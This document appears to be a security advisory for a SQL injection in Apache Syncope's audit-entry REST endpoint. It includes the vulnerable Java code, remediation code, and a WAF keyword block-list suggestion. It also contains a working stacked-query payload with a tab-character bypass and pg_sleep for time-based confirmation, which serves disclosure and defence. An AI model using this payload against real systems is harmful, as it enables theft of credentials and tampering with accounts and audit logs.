# CVE-2026-57308 — SQL Injection in Apache Syncope

| Field            | Value                                                                                   |
|------------------|-----------------------------------------------------------------------------------------|
| Product          | [Apache Syncope](https://syncope.apache.org/)                                           |
| Version          | 3.0.0 – 3.0.16 (all), 4.0.0-M0+                                                        |
| File             | `JPAAuditConfDAO.java` (3.0.x), `JPAAuditEventDAO.java` (4.x)                           |
| CVE              | CVE-2026-57308                                                                          |
| CWE              | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command             |
| CVSS 3.1 Vector  | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L                                                     |
| CVSS Score       | 8.8 (High)                                                                              |
| Vendor Severity  | Important (Apache Software Foundation)                                                  |
| Auth Required    | Yes (`AUDIT_SEARCH` entitlement)                                                        |
| Discovered by    | Lennart Hostettler                                                                      |
| Date             | 20/06/2026                                                                              |

## Description

Apache Syncope constructs native SQL queries for audit log searches by directly concatenating
user-supplied sort parameters into an `ORDER BY` clause without sanitization or parameterization.
An authenticated user with minimal privileges (`AUDIT_SEARCH` entitlement) can abuse this to
execute arbitrary SQL queries against the backend database via the `/syncope/rest/audit/entries`
endpoint.

The vulnerability exists in two classes across two branches:

| Branch  | Class                    | Introduced |
|---------|--------------------------|------------|
| 3.0.x   | JPAAuditConfDAO.java     | 2021-07-17 |
| 4.0.x+  | JPAAuditEventDAO.java    | 2024-03-11 |

## Vulnerable Code

**3.0.x branch** (`JPAAuditConfDAO.java`):
```java
if (!orderBy.isEmpty()) {
    queryString += " ORDER BY " + orderBy.stream()
        .map(clause -> clause.getField()           // <-- unsanitized user input
            + ' ' + clause.getDirection().name())
        .collect(Collectors.joining(","));
}
Query query = entityManager().createNativeQuery(queryString);
```

**4.0.x branch** (`JPAAuditEventDAO.java`, line ~172):
```java
if (!pageable.getSort().isEmpty()) {
    queryString += " ORDER BY " + pageable.getSort().stream()
        .map(clause ->
            ("when".equals(clause.getProperty())
                ? "event_date"
                : clause.getProperty())          // <-- unsanitized user input
            + ' ' + clause.getDirection().name())
        .collect(Collectors.joining(","));
}
Query query = entityManager.createNativeQuery(queryString);
```

## Exploitation

The `orderby` HTTP query parameter flows from the REST layer directly into the SQL query without
validation. The parser splits the value by space, taking only the first token as the column name.
This can be trivially bypassed using a tab character (`%09`), which PostgreSQL accepts as whitespace.

**Attack endpoint:**
```
GET /syncope/rest/audit/entries?orderby=<injection>&page=1&size=1&type=LOGIC
```

**Minimal payload example** (time-based blind SQLi with 3-second delay):
```
orderby=event_date%3BSELECT%09pg_sleep(3)--%20ASC
```

This results in the following SQL being executed:
```sql
SELECT MESSAGE FROM AuditEntry
WHERE MESSAGE LIKE '%"type":"LOGIC"%'
ORDER BY event_date;
SELECT pg_sleep(3)-- ASC
```

The stacked query (`SELECT ... ; SELECT ...`) causes the configured delay, confirming code injection.

## Privilege Level Requirements

The minimum required privilege is `AUDIT_SEARCH` — a standard read-only entitlement commonly granted to auditor and compliance roles, **not exclusive to administrators**:

| Account       | Entitlement      | Endpoint Access | SQLi Exploitable |
|---------------|------------------|-----------------|------------------|
| admin         | All              | Yes (HTTP 200)  | Yes              |
| testauditor   | AUDIT_SEARCH     | Yes (HTTP 200)  | **Yes (verified)** |
| testmonitor   | LOGGER_LIST      | No (HTTP 403)   | No               |
| Anonymous     | None             | No (HTTP 401)   | No               |

## Impact

An authenticated attacker with `AUDIT_SEARCH` can:

**Confidentiality (High):**
- Extract all data accessible to the `syncope` database user: user credentials, password hashes, security tokens, group memberships, full audit history

**Integrity (High):**
- Use stacked queries to execute `INSERT`, `UPDATE`, or `DELETE` statements
- Tamper with user accounts, roles, and entitlements
- Manipulate audit logs to cover tracks

**Availability (Low):**
- Repeated `pg_sleep()` calls saturate database connection pools, degrading service performance

## Remediation

**Primary Fix — Whitelist Validation:**

Replace direct column concatenation with a strict allowlist of permitted sort columns:

```java
private static final Set<String> ALLOWED_SORT_COLUMNS = Set.of(
    "event_date", "type", "category",
    "subcategory", "outcome", "key"
);

String col = "when".equals(clause.getProperty())
    ? "event_date"
    : clause.getProperty();

if (!ALLOWED_SORT_COLUMNS.contains(col)) {
    throw new IllegalArgumentException("Invalid sort column: " + col);
}

queryString += " ORDER BY " + col + " "
    + clause.getDirection().name();
```

**Alternative Fix — JPA Criteria API:**

Replace native SQL queries with JPA Criteria API, which handles parameterization automatically:

```java
CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<AuditEntry> cq = cb.createQuery(AuditEntry.class);
Root<AuditEntry> root = cq.from(AuditEntry.class);

List<Order> orders = pageable.getSort().stream()
    .map(o -> o.isAscending()
        ? cb.asc(root.get(o.getProperty()))
        : cb.desc(root.get(o.getProperty())))
    .collect(Collectors.toList());

cq.orderBy(orders);
```

**Additional Mitigations:**
1. Restrict database user privileges to DML only (no DDL: `DROP`, `CREATE`, `ALTER`)
2. Add input validation layer with `@Pattern` constraint on the `orderby` parameter
3. Deploy WAF rule to block requests containing SQL keywords (`SELECT`, `INSERT`, `DROP`, `pg_sleep`)

## Vendor Response

The Apache Software Foundation responded quickly and professionally throughout the coordinated disclosure process, communicating transparently and working toward a timely fix. This is how responsible vendor engagement should work.

## References

- [CVE-2026-57308](https://www.cve.org/CVERecord?id=CVE-2026-57308)
- [Apache Syncope security advisory (mailing list)](https://lists.apache.org/thread/g0gpctj90pbczbjl5jr33t8gr1gltg8v)
- [Apache Syncope GitHub — SYNCOPE-1615](https://github.com/apache/syncope/commit/74a626cf4b)
- [Apache Syncope GitHub — SYNCOPE-1810](https://github.com/apache/syncope/commit/0020ef75d4)
